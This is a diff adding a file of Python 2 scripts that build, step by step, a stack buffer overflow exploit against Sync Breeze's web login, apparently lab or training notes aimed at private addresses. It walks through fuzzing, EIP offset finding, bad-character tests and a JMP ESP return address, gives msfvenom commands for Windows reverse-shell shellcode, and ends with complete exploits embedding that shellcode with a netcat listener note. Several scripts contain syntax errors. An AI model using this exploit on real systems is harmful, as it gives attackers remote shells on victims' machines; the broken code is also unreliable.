@@ -1,0 +1,470 @@
+#!/usr/bin/python
+# determine size
+
+import socket
+import time
+import sys
+
+size = 100
+
+while(size < 2000):
+	try:
+		print "\nSending buffer with %s bytes" % size
+		inputBuffer = "A" + size
+
+		content = "username=" + inputBuffer + "&password=A"
+
+		buffer = "POST /login HTTP/1.1\r\n"
+		buffer += "Host: 10.11.0.22\r\n"
+		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+		buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+		buffer += "Referer: http://10.11.0.22/login\r\n"
+		buffer += "Connection: close\r\n"
+		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+		buffer += "Content-Length: "+str(len(content))+"\r\n"
+		buffer += "\r\n"
+
+buffer += content
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect(("10.11.0.22", 80))
+s.send(buffer)
+
+s.close()
+size += 100
+time.sleep(10)
+_______________________________________________________________________________________
+#!/usr/bin/python
+# use msf-pattern_create for inputBuffer data
+# msf-pattern_create -l [size]
+# use msf-pattern_offset to find specific number of bytes
+# msf-pattern_offset -l [size] -q [EIP bytes]
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	inputBuffer = ""
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+
+_______________________________________________________________________________________
+#!/usr/bin/python
+# change filler for the specific amount of bytes
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	filler = "A" * 780
+	eip = "B" * 4
+	buffer = "C" * 16
+
+	inputBuffer = filler + eip + buffer
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+_______________________________________________________________________________________
+#!/usr/bin/python
+# change filler for the specific amount of bytes
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	filler = "A" * 780
+	eip = "B" * 4
+	offset "C" * 4
+	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
+
+	inputBuffer = filler + eip + offset +buffer
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+_______________________________________________________________________________________
+#!/usr/bin/python
+# checking for bad characters
+
+import socket
+
+
+badchars = (
+"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+try: 
+	print "\nSending buffer..."
+	
+	filler = "A" * 780
+	eip = "B" * 4
+	offset "C" * 4
+
+	inputBuffer = filler + eip + offset + badchars
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+_______________________________________________________________________________________
+# badchars found for syncbreeze "\x00\x0a\x0d\x25\x26\x2b\x3d"
+# return address must be static, not contain any badchars
+# use mona.py to search for return address and dll 
+# [!mona modules], flags == false
+# find opcode equivalent of JMP ESP
+# use msf-nasm_shell (search for jmp esp), opcode = FFE4
+# [!mona find -s "\xff\xe4" -m "libspp.dll"]
+# record address 0x10090c83
+# go to button, search for address 0x10090c83
+_______________________________________________________________________________________
+#!/usr/bin/python
+# BOF for syncbreeze, check if jmp esp address is sent and buffer is written
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	filler = "A" * 780
+	eip = "\x83\x0c\x09\x10"
+	offset "C" * 4
+	buffer = "D" * (1500 - len(filler) - len (eip) - len(offset))
+
+	inputBuffer = filler + eip + offset + buffer
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+_______________________________________________________________________________________
+# Generate shell code with msfvenom (change IP as needed)
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+
+_______________________________________________________________________________________
+#!/usr/bin/python
+# BOF for syncbreeze, reverse shell
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	shellcode = ("\xbf\xc7\xea\xbf\xba\xdb\xd7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x52\x31\x7d\x12\x03\x7d\x12\x83\x2a\x16\x5d\x4f\x48\x0f\x20"
+"\xb0\xb0\xd0\x45\x38\x55\xe1\x45\x5e\x1e\x52\x76\x14\x72\x5f"
+"\xfd\x78\x66\xd4\x73\x55\x89\x5d\x39\x83\xa4\x5e\x12\xf7\xa7"
+"\xdc\x69\x24\x07\xdc\xa1\x39\x46\x19\xdf\xb0\x1a\xf2\xab\x67"
+"\x8a\x77\xe1\xbb\x21\xcb\xe7\xbb\xd6\x9c\x06\xed\x49\x96\x50"
+"\x2d\x68\x7b\xe9\x64\x72\x98\xd4\x3f\x09\x6a\xa2\xc1\xdb\xa2"
+"\x4b\x6d\x22\x0b\xbe\x6f\x63\xac\x21\x1a\x9d\xce\xdc\x1d\x5a"
+"\xac\x3a\xab\x78\x16\xc8\x0b\xa4\xa6\x1d\xcd\x2f\xa4\xea\x99"
+"\x77\xa9\xed\x4e\x0c\xd5\x66\x71\xc2\x5f\x3c\x56\xc6\x04\xe6"
+"\xf7\x5f\xe1\x49\x07\xbf\x4a\x35\xad\xb4\x67\x22\xdc\x97\xef"
+"\x87\xed\x27\xf0\x8f\x66\x54\xc2\x10\xdd\xf2\x6e\xd8\xfb\x05"
+"\x90\xf3\xbc\x99\x6f\xfc\xbc\xb0\xab\xa8\xec\xaa\x1a\xd1\x66"
+"\x2a\xa2\x04\x28\x7a\x0c\xf7\x89\x2a\xec\xa7\x61\x20\xe3\x98"
+"\x92\x4b\x29\xb1\x39\xb6\xba\xb4\xb6\xb8\x3e\xa1\xca\xb8\x3f"
+"\x8a\x42\x5e\x55\xfc\x02\xc9\xc2\x65\x0f\x81\x73\x69\x85\xec"
+"\xb4\xe1\x2a\x11\x7a\x02\x46\x01\xeb\xe2\x1d\x7b\xba\xfd\x8b"
+"\x13\x20\x6f\x50\xe3\x2f\x8c\xcf\xb4\x78\x62\x06\x50\x95\xdd"
+"\xb0\x46\x64\xbb\xfb\xc2\xb3\x78\x05\xcb\x36\xc4\x21\xdb\x8e"
+"\xc5\x6d\x8f\x5e\x90\x3b\x79\x19\x4a\x8a\xd3\xf3\x21\x44\xb3"
+"\x82\x09\x57\xc5\x8a\x47\x21\x29\x3a\x3e\x74\x56\xf3\xd6\x70"
+"\x2f\xe9\x46\x7e\xfa\xa9\x77\x35\xa6\x98\x1f\x90\x33\x99\x7d"
+"\x23\xee\xde\x7b\xa0\x1a\x9f\x7f\xb8\x6f\x9a\xc4\x7e\x9c\xd6"
+"\x55\xeb\xa2\x45\x55\x3e")
+
+	filler = "A" * 780
+	eip = "\x83\x0c\x09\x10"
+	offset "C" * 4
+
+	inputBuffer = filler + eip + offset + shellcode
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+
+_______________________________________________________________________________________
+#!/usr/bin/python
+# BOF for syncbreeze, reverse shell
+# added 10 nops (x90) to bypass [GET PC] instruction
+# start nc listener, sudo nc -nlvp 443
+# note, program crashes after reverse shell exit
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	shellcode = ("\xbf\xc7\xea\xbf\xba\xdb\xd7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x52\x31\x7d\x12\x03\x7d\x12\x83\x2a\x16\x5d\x4f\x48\x0f\x20"
+"\xb0\xb0\xd0\x45\x38\x55\xe1\x45\x5e\x1e\x52\x76\x14\x72\x5f"
+"\xfd\x78\x66\xd4\x73\x55\x89\x5d\x39\x83\xa4\x5e\x12\xf7\xa7"
+"\xdc\x69\x24\x07\xdc\xa1\x39\x46\x19\xdf\xb0\x1a\xf2\xab\x67"
+"\x8a\x77\xe1\xbb\x21\xcb\xe7\xbb\xd6\x9c\x06\xed\x49\x96\x50"
+"\x2d\x68\x7b\xe9\x64\x72\x98\xd4\x3f\x09\x6a\xa2\xc1\xdb\xa2"
+"\x4b\x6d\x22\x0b\xbe\x6f\x63\xac\x21\x1a\x9d\xce\xdc\x1d\x5a"
+"\xac\x3a\xab\x78\x16\xc8\x0b\xa4\xa6\x1d\xcd\x2f\xa4\xea\x99"
+"\x77\xa9\xed\x4e\x0c\xd5\x66\x71\xc2\x5f\x3c\x56\xc6\x04\xe6"
+"\xf7\x5f\xe1\x49\x07\xbf\x4a\x35\xad\xb4\x67\x22\xdc\x97\xef"
+"\x87\xed\x27\xf0\x8f\x66\x54\xc2\x10\xdd\xf2\x6e\xd8\xfb\x05"
+"\x90\xf3\xbc\x99\x6f\xfc\xbc\xb0\xab\xa8\xec\xaa\x1a\xd1\x66"
+"\x2a\xa2\x04\x28\x7a\x0c\xf7\x89\x2a\xec\xa7\x61\x20\xe3\x98"
+"\x92\x4b\x29\xb1\x39\xb6\xba\xb4\xb6\xb8\x3e\xa1\xca\xb8\x3f"
+"\x8a\x42\x5e\x55\xfc\x02\xc9\xc2\x65\x0f\x81\x73\x69\x85\xec"
+"\xb4\xe1\x2a\x11\x7a\x02\x46\x01\xeb\xe2\x1d\x7b\xba\xfd\x8b"
+"\x13\x20\x6f\x50\xe3\x2f\x8c\xcf\xb4\x78\x62\x06\x50\x95\xdd"
+"\xb0\x46\x64\xbb\xfb\xc2\xb3\x78\x05\xcb\x36\xc4\x21\xdb\x8e"
+"\xc5\x6d\x8f\x5e\x90\x3b\x79\x19\x4a\x8a\xd3\xf3\x21\x44\xb3"
+"\x82\x09\x57\xc5\x8a\x47\x21\x29\x3a\x3e\x74\x56\xf3\xd6\x70"
+"\x2f\xe9\x46\x7e\xfa\xa9\x77\x35\xa6\x98\x1f\x90\x33\x99\x7d"
+"\x23\xee\xde\x7b\xa0\x1a\x9f\x7f\xb8\x6f\x9a\xc4\x7e\x9c\xd6"
+"\x55\xeb\xa2\x45\x55\x3e")
+
+	filler = "A" * 780
+	eip = "\x83\x0c\x09\x10"
+	offset "C" * 4
+	nops = "\x90" * 10
+
+	inputBuffer = filler + eip + offset + nops + shellcode
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+_______________________________________________________________________________________
+# improve code with EXIT THREAD option to avoid crash when reverse shell is terminated
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+_______________________________________________________________________________________
+#!/usr/bin/python
+# BOF for syncbreeze, reverse shell
+# start nc listener, sudo nc -nlvp 443
+# program does not crash after reverse shell termination
+
+import socket
+
+try: 
+	print "\nSending buffer..."
+	
+	shellcode = ("\xba\x7f\xd6\xd2\x43\xdd\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x52\x83\xc0\x04\x31\x50\x0e\x03\x2f\xd8\x30\xb6\x33\x0c\x36"
+"\x39\xcb\xcd\x57\xb3\x2e\xfc\x57\xa7\x3b\xaf\x67\xa3\x69\x5c"
+"\x03\xe1\x99\xd7\x61\x2e\xae\x50\xcf\x08\x81\x61\x7c\x68\x80"
+"\xe1\x7f\xbd\x62\xdb\x4f\xb0\x63\x1c\xad\x39\x31\xf5\xb9\xec"
+"\xa5\x72\xf7\x2c\x4e\xc8\x19\x35\xb3\x99\x18\x14\x62\x91\x42"
+"\xb6\x85\x76\xff\xff\x9d\x9b\x3a\x49\x16\x6f\xb0\x48\xfe\xa1"
+"\x39\xe6\x3f\x0e\xc8\xf6\x78\xa9\x33\x8d\x70\xc9\xce\x96\x47"
+"\xb3\x14\x12\x53\x13\xde\x84\xbf\xa5\x33\x52\x34\xa9\xf8\x10"
+"\x12\xae\xff\xf5\x29\xca\x74\xf8\xfd\x5a\xce\xdf\xd9\x07\x94"
+"\x7e\x78\xe2\x7b\x7e\x9a\x4d\x23\xda\xd1\x60\x30\x57\xb8\xec"
+"\xf5\x5a\x42\xed\x91\xed\x31\xdf\x3e\x46\xdd\x53\xb6\x40\x1a"
+"\x93\xed\x35\xb4\x6a\x0e\x46\x9d\xa8\x5a\x16\xb5\x19\xe3\xfd"
+"\x45\xa5\x36\x51\x15\x09\xe9\x12\xc5\xe9\x59\xfb\x0f\xe6\x86"
+"\x1b\x30\x2c\xaf\xb6\xcb\xa7\xda\x4d\xd3\x33\xb3\x53\xd3\x3a"
+"\xf8\xdd\x35\x56\xee\x8b\xee\xcf\x97\x91\x64\x71\x57\x0c\x01"
+"\xb1\xd3\xa3\xf6\x7c\x14\xc9\xe4\xe9\xd4\x84\x56\xbf\xeb\x32"
+"\xfe\x23\x79\xd9\xfe\x2a\x62\x76\xa9\x7b\x54\x8f\x3f\x96\xcf"
+"\x39\x5d\x6b\x89\x02\xe5\xb0\x6a\x8c\xe4\x35\xd6\xaa\xf6\x83"
+"\xd7\xf6\xa2\x5b\x8e\xa0\x1c\x1a\x78\x03\xf6\xf4\xd7\xcd\x9e"
+"\x81\x1b\xce\xd8\x8d\x71\xb8\x04\x3f\x2c\xfd\x3b\xf0\xb8\x09"
+"\x44\xec\x58\xf5\x9f\xb4\x79\x14\x35\xc1\x11\x81\xdc\x68\x7c"
+"\x32\x0b\xae\x79\xb1\xb9\x4f\x7e\xa9\xc8\x4a\x3a\x6d\x21\x27"
+"\x53\x18\x45\x94\x54\x09")
+
+	filler = "A" * 780
+	eip = "\x83\x0c\x09\x10"
+	offset "C" * 4
+	nops = "\x90" * 10
+
+	inputBuffer = filler + eip + offset + nops + shellcode
+
+	content = "username=" + inputBuffer + "&password=A"
+	buffer = "POST /login HTTP/1.1\r\n"
+	buffer += "Host: 10.11.0.22\r\n"
+	buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+	buffer += "Referer: http://10.11.0.22/login\r\n"
+	buffer += "Connection: close\r\n"
+	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+	buffer += "Content-Length: "+str(len(content))+"\r\n"
+	buffer += "\r\n"
+	
+	buffer += content
+
+	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+
+	s.connect(("10.11.0.22", 80))
+	s.send(buffer)
+
+	s.close()
+	
+	print "\nDone!"
+
+except:
+	print "\nCould not connect!"
+
